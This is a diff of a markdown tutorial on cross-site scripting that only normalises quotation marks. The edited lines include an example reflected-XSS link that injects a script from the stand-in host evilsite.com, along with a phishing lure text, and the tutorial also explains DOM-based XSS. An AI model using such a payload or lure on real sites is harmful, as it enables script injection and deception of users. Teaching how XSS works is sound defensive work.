@@ -132,7 +132,7 @@ Image Credit: https://medium.com/iocscan/reflected-cross-site-scripting-r-xss-b0
 - An attacker sends a link to a target in email which looks like:
 
 ```html
-    https://vulnerablewebsite.com?q=news<\script%20src=”http://evilsite.com/payload.js"
+    https://vulnerablewebsite.com?q=news<\script%20src="http://evilsite.com/payload.js"
 ```
 - Along with a deceptive description like _Please review this suspicious transaction on your account_
 - A vulnerable website will return the unfiltered content of the query in the error message
@@ -148,8 +148,8 @@ Error!!
 
 ## DOM XSS Attack
 
-- The attack payload is executed by modifying the DOM “environment” in the victim's browser
-- The modification causes the original client side script to run in an “unexpected” manner
+- The attack payload is executed by modifying the DOM "environment" in the victim's browser
+- The modification causes the original client side script to run in an "unexpected" manner
 - The HTTP responses is not affected, the HTML does not contain the attack payload
 - The payload is in the body of the page as part of the DOM tree
 - The client side code now executes differently because of the DOM modification
